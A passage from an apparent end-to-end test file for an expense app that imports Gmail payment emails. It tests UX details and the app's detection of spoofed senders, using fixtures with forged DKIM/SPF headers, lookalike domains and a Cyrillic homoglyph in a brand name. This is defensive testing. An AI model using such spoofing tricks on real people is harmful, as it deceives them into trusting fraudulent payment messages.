      { id: "a2", amount: 20, currency: "MAD", date: "2026-10-12", merchant: "Shop B", sender: "B", status: "new", kind: "debit", cat: "drinks", confidence: 0.9 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    /* a double-tap: the second tap lands where the next row's button now sits */
    await app.page.click('[data-inbox-add="a1"]');
    await app.page.evaluate(() => { const b = document.querySelector('[data-inbox-add="a2"]'); if (b) b.click(); });
    await app.page.waitForTimeout(400);
    const s = await app.stored();
    t.eq("the second half of a double-tap does nothing", s.expenses.length, 1);
    await app.close();
  }
  {
    /* a 2-2 tie is not a habit; "CIH Bank" (a fallback name) is never learned */
    const app = await boot(browser, connected({ expenses: [
      expense({ id: "t1", amount: 5, date: "2026-10-01", cat: "out", note: "Glovo" }), expense({ id: "t2", amount: 5, date: "2026-10-02", cat: "out", note: "Glovo" }),
      expense({ id: "t3", amount: 5, date: "2026-10-03", cat: "drinks", note: "Glovo" }), expense({ id: "t4", amount: 5, date: "2026-10-04", cat: "drinks", note: "Glovo" }) ] }), { now: NOW });
    await fakeGoogle(app, { ids: ["g1"] });
    await returnFromGoogle(app, "y".repeat(40));
    t.eq("a tie leaves the parser's category", (await app.stored()).inbox.find(x => x.id === "g1").cat, "food");
    await app.close();
  }
  {
    /* Gmail says the "Glovo" sender failed its check: flagged, and no "your usual" */
    const forged = Object.assign({}, MAILS.g1, { id: "f1", threadId: "f1" });
    forged.payload = Object.assign({}, forged.payload, { headers: forged.payload.headers.concat([
      { name: "Authentication-Results", value: "mx.google.com; dkim=fail header.i=@evil.example; spf=fail smtp.mailfrom=evil.example" }]) });
    MAILS.f1 = forged;
    const app = await boot(browser, connected({ expenses: [
      expense({ id: "u1", amount: 5, date: "2026-10-01", cat: "out", note: "Glovo" }), expense({ id: "u2", amount: 5, date: "2026-10-02", cat: "out", note: "Glovo" }) ] }), { now: NOW });
    await fakeGoogle(app, { ids: ["f1"] });
    await returnFromGoogle(app, "z".repeat(40));
    delete MAILS.f1;
    const it = (await app.stored()).inbox.find(x => x.id === "f1");
    t.eq("a sender Gmail could not verify is marked so", it && it.verified, 0);
    t.no("and never gets your usual category", it && it.learned === 1);
    t.has("you can see it in the inbox", norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText)), "sender not verified by Gmail");
    await app.close();
  }

  /* ---- loop 2 UX polish ---- */
  {
    const app = await boot(browser, connected({ inbox: [ { id: "L0", amount: 10, currency: "MAD", date: "2026-10-14", merchant: "Shop 0", sender: "S0", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L1", amount: 11, currency: "MAD", date: "2026-10-13", merchant: "Shop 1", sender: "S1", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L2", amount: 12, currency: "MAD", date: "2026-10-12", merchant: "Shop 2", sender: "S2", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L3", amount: 13, currency: "MAD", date: "2026-10-11", merchant: "Shop 3", sender: "S3", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L4", amount: 14, currency: "MAD", date: "2026-10-10", merchant: "Shop 4", sender: "S4", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L5", amount: 15, currency: "MAD", date: "2026-10-09", merchant: "Shop 5", sender: "S5", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L6", amount: 16, currency: "MAD", date: "2026-10-08", merchant: "Shop 6", sender: "S6", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L7", amount: 17, currency: "MAD", date: "2026-10-07", merchant: "Shop 7", sender: "S7", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L8", amount: 18, currency: "MAD", date: "2026-10-06", merchant: "Shop 8", sender: "S8", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L9", amount: 19, currency: "MAD", date: "2026-10-05", merchant: "Shop 9", sender: "S9", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L10", amount: 20, currency: "MAD", date: "2026-10-14", merchant: "Shop 10", sender: "S10", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
{ id: "L11", amount: 21, currency: "MAD", date: "2026-10-13", merchant: "Shop 11", sender: "S11", status: "new", kind: "debit", cat: "food", confidence: 0.9 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    await app.page.evaluate(() => { const sh = document.querySelector("#sheet"); sh.scrollTop = 700; });
    await app.page.waitForTimeout(100);
    const id = await app.page.evaluate(() => { const b = [...document.querySelectorAll("[data-inbox-add]")].find(b => b.getBoundingClientRect().top > 0); return b.getAttribute("data-inbox-add"); });
    await app.page.evaluate(i => document.querySelector('[data-inbox-add="' + i + '"]').click(), id);
    await app.page.waitForTimeout(500);
    t.ok("the list keeps your place after an Add", await app.page.evaluate(() => document.querySelector("#sheet").scrollTop > 300));
    const h = await app.page.evaluate(() => { const b = document.querySelector("#toast button"); return b ? b.getBoundingClientRect().height : 0; });
    t.ok("Undo is a full-size target", h >= 44, "height " + h);
    await app.close();
  }
  {
    const app = await boot(browser, connected({ inbox: [
      { id: "nv", amount: 40, currency: "MAD", date: "2026-10-13", merchant: "Glovo", sender: "Glovo", status: "new", kind: "debit", cat: "food", confidence: 0.9, verified: 0 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    await app.page.click('[data-inbox-add="nv"]'); await app.page.waitForTimeout(400);
    t.ok("a sender Gmail did not verify is never saved in one tap", await app.page.evaluate(() => !!document.querySelector("#f-save")));
    t.eq("nothing saved yet", (await app.stored()).expenses.length, 0);
    await app.close();
  }

  /* ---- loop 2 security: "verified" means a known brand, checked by Gmail ---- */
  {
    const mk = (id, from, auth, html) => {
      const m = msg(id, from, "Paiement par carte", html || "<p>Paiement par carte ****4521 d'un montant de 77,00 MAD chez MARJANE le 13/10/2026.</p>");
      if (auth) m.payload.headers.push({ name: "Authentication-Results", value: auth });
      return m;
    };
    MAILS.v1 = mk("v1", "CIH Bank <alerts@gmail.com>", "mx.google.com; dkim=pass header.i=@gmail.com; spf=pass smtp.mailfrom=gmail.com");
    MAILS.v2 = mk("v2", "CIH Bank <alertes@cihbank-notif.com>", "mx.google.com; dkim=pass header.i=@cihbank-notif.com");
    MAILS.v3 = msg("v3", "Glovo <no-reply@glovoapp.com>", "Votre commande Glovo", "<p>Total : 61,00 MAD</p>");
    MAILS.v3.payload.headers.push({ name: "Authentication-Results", value: "mx.google.com; dkim=pass header.i=@glovoapp.com" });
    const app = await boot(browser, connected(), { now: NOW });
    await fakeGoogle(app, { ids: ["v1", "v2", "v3"] });
    await returnFromGoogle(app, "k".repeat(40));
    ["v1", "v2", "v3"].forEach(k => delete MAILS[k]);
    const inbox = (await app.stored()).inbox, ver = id => (inbox.find(x => x.id === id) || {}).verified;
    t.eq("“CIH Bank” sending from gmail.com is flagged, though gmail.com checks out", ver("v1"), 0);
    t.eq("a lookalike domain signing for itself is flagged", ver("v2"), 0);
    t.eq("the real Glovo, checked by Gmail, is verified", ver("v3"), 1);
    await app.close();
  }

  /* ---- loop 2 QA, app side ---- */
  {
    MAILS.h1 = msg("h1", "Glovo <no-reply@glovoapp.com>", "Votre commande Glovo", "<p>Total : 52,00 MAD</p>");
    MAILS.h1.payload.headers.push({ name: "Authentication-Results", value: "mx.google.com; dkim=pass header.i=noreply@glovoapp.com header.s=s1" });
    const app = await boot(browser, connected(), { now: NOW });
    await fakeGoogle(app, { ids: ["h1"] });
    await returnFromGoogle(app, "j".repeat(40));
    delete MAILS.h1;
    t.eq("a DKIM pass written header.i=user@domain counts as verified", ((await app.stored()).inbox.find(x => x.id === "h1") || {}).verified, 1);
    await app.close();
  }
  {
    const app = await boot(browser, connected({ lastCat: "health", inbox: [
      { id: "lc", amount: 30, currency: "MAD", date: "2026-10-13", merchant: "Careem", sender: "Careem", status: "new", kind: "debit", cat: "transport", confidence: 0.9 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    await app.page.click('[data-inbox-add="lc"]'); await app.page.waitForTimeout(400);
    await app.page.click("#toast button"); await app.page.waitForTimeout(400);
    t.eq("Undo also puts your last-used category back", (await app.stored()).lastCat, "health");
    await app.close();
  }
  {
    const app = await boot(browser, connected({ inbox: [
      { id: "mc", amount: 30, currency: "MAD", date: "2026-10-13", merchant: "Shop", sender: "Shop", status: "new", kind: "debit", cat: "food", confidence: 0.75 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    await app.page.click('[data-inbox-add="mc"]'); await app.page.waitForTimeout(400);
    t.ok("a read the app is only fairly sure of goes through the form", await app.page.evaluate(() => !!document.querySelector("#f-save")));
    await app.close();
  }

  /* ---- a newer parser gets a second look at what an older one ignored ---- */
  {
    const app = await boot(browser, connected({ gmail: { clientId: CLIENT, lastSec: Math.floor(Date.parse(NOW) / 1000) - 3600, parserVer: "3" },
      mailSeen: { g1: -1790000000000, c1: 1790000000000 } }), { now: NOW });
    const calls = await fakeGoogle(app, { ids: ["g1", "c1"] });
    await returnFromGoogle(app, "p".repeat(40));
    const s = await app.stored();
    t.eq("the email the old parser ignored is fetched again", calls.get, 1);
    t.ok("and offered now", s.inbox.some(x => x.id === "g1"));
    t.eq("the parser version is recorded", s.gmail.parserVer, require(require("path").join(require("../harness").APP_DIR, "mail-parse.js")).VERSION);
    t.ok("and the window reached back a month for it", calls.urls.some(u => { const m = decodeURIComponent(u).match(/after:(\d+)/); return m && +m[1] < Date.parse(NOW) / 1000 - 20 * 86400; }));
    await app.close();
  }

  /* ---- loop 3 UX: the button says what it will do ---- */
  {
    const app = await boot(browser, connected({ inbox: [
      { id: "r1", amount: 89.9, currency: "MAD", date: "2026-10-13", merchant: "KFC Maarif", sender: "KFC", status: "new", kind: "debit", cat: "food", confidence: 0.75 },
      { id: "r2", amount: 32, currency: "MAD", date: "2026-10-13", merchant: "Careem", sender: "Careem", status: "new", kind: "debit", cat: "transport", confidence: 0.9 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    t.eq("a row the app is unsure of says Review", (await app.page.textContent('[data-inbox-add="r1"]')).trim(), "Review");
    t.eq("a confident row says Add", (await app.page.textContent('[data-inbox-add="r2"]')).trim(), "Add");
    await app.close();
  }

  /* ---- loop 4: the safety net -- whatever the parser says ---- */
  {
    /* the parser may (wrongly) accept these; the app must still not one-tap them */
    MAILS.n1 = msg("n1", "CIH Bank <alertes@cihbank.ma>", "Alerte carte", "<p>Paiement par carte ****4521 d'un montant de 899,00 MAD chez AMAZON le 13/10/2026. Transaction non autorisée.</p>");
    MAILS.n2 = msg("n2", "Glovo <no-reply@glovoapp.com>", "Votre commande Glovo", "<p>Total : 78,00 MAD</p><p>Your order has been cancelled. You will not be charged.</p>");
    MAILS.n3 = msg("n3", "inwi <facturation@inwi.ma>", "Votre facture inwi", "<p>Votre facture est disponible. Total : 199,00 DH. Date limite de paiement : 30/10/2026.</p>");
    const app = await boot(browser, connected(), { now: NOW });
    await fakeGoogle(app, { ids: ["n1", "n2", "n3"] });
    await returnFromGoogle(app, "q".repeat(40));
    ["n1", "n2", "n3"].forEach(k => delete MAILS[k]);
    const s = await app.stored();
    for (const id of ["n1", "n2", "n3"]) {
      const it = s.inbox.find(x => x.id === id);
      if (!it) { t.ok("“" + id + "” not offered at all (also safe)", true); continue; }
      t.ok("“" + id + "” is marked for a second look (" + it.caution + ")", !!it.caution);
      const label = (await app.page.textContent('[data-inbox-add="' + id + '"]').catch(() => "")).trim();
      t.eq("and its button says Review, not Add", label, "Review");
    }
    await app.close();
  }
  {
    /* money in is never a dead end */
    const app = await boot(browser, connected({ inbox: [
      { id: "mi", amount: 900, currency: "MAD", date: "2026-10-13", merchant: "Rachid", sender: "CIH Bank", status: "new", kind: "credit", cat: "", confidence: 0.85 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    await app.page.click('[data-inbox-edit="mi"]'); await app.page.waitForTimeout(400);
    t.eq("“It was an expense” opens it as one", await app.page.inputValue("#f-amount"), "900");
    await app.close();
  }
  {
    /* security lows: lookalike letters in a display name, a pass hidden in a comment */
    const v = await (async () => {
      const app = await boot(browser, connected(), { now: NOW });
      const r = await app.page.evaluate(() => 0);
      await app.close(); return r;
    })();
    MAILS.w1 = msg("w1", "Gl\u043evo <orders@freemail.example>", "Votre commande", "<p>Total : 40,00 MAD</p>");
    MAILS.w2 = msg("w2", "Glovo <no-reply@glovoapp.com>", "Votre commande Glovo", "<p>Total : 41,00 MAD</p>");
    MAILS.w2.payload.headers.push({ name: "Authentication-Results", value: "mx.google.com; dkim=fail (dkim=pass header.i=@glovoapp.com) header.i=@evil.example" });
    const app = await boot(browser, connected(), { now: NOW });
    await fakeGoogle(app, { ids: ["w1", "w2"] });
    await returnFromGoogle(app, "r".repeat(40));
    ["w1", "w2"].forEach(k => delete MAILS[k]);
    const inbox = (await app.stored()).inbox, ver = id => (inbox.find(x => x.id === id) || {}).verified;
    t.eq("a Cyrillic “о” in “Glovo” is still caught as a claim", ver("w1"), 0);
    t.eq("a pass written inside a comment does not count", ver("w2"), 0);
    await app.close();
  }

  /* ---- final panel UX: Review must REVIEW (it saved in one tap) ---- */
  {
    const app = await boot(browser, connected({ inbox: [
      { id: "cz", amount: 62, currency: "MAD", date: "2026-10-13", merchant: "Glovo", sender: "Glovo", status: "new", kind: "debit", cat: "food", confidence: 0.9, verified: 1, caution: "declined" } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    t.eq("a caution row says Review", (await app.page.textContent('[data-inbox-add="cz"]')).trim(), "Review");
    await app.page.click('[data-inbox-add="cz"]'); await app.page.waitForTimeout(450);
    t.ok("and tapping it opens the form", await app.page.evaluate(() => !!document.querySelector("#f-save")));
    t.eq("saving nothing behind your back", (await app.stored()).expenses.length, 0);
    t.has("the form says what to check", norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText)), "check your bank shows this payment");
    await app.page.click(".sheet-x"); await app.page.waitForTimeout(400);
    t.ok("✕ goes back to the inbox, not Home", await app.page.evaluate(() => !!document.querySelector("#inbox-list")));
    await app.close();
  }
  {
    /* a normal CIH alert with the bank's standard footer stays one tap */
    MAILS.bf = msg("bf", "CIH Bank <alertes@cihbank.ma>", "Paiement par carte",
      "<p>Paiement par carte ****4521 d'un montant de 120,00 MAD chez MARJANE le 13/10/2026.</p><p>En cas d'opération non autorisée, bloquez votre carte au 0522 47 47 47. CIH décline toute responsabilité.</p>");
    MAILS.bf.payload.headers.push({ name: "Authentication-Results", value: "mx.google.com; dkim=pass header.i=@cihbank.ma" });
    const app = await boot(browser, connected(), { now: NOW });
    await fakeGoogle(app, { ids: ["bf"] });
    await returnFromGoogle(app, "b".repeat(40));
    delete MAILS.bf;
    const it = (await app.stored()).inbox.find(x => x.id === "bf");
    t.eq("the bank's footer does not raise a false alarm", it && it.caution, "");
    await app.close();
  }
};
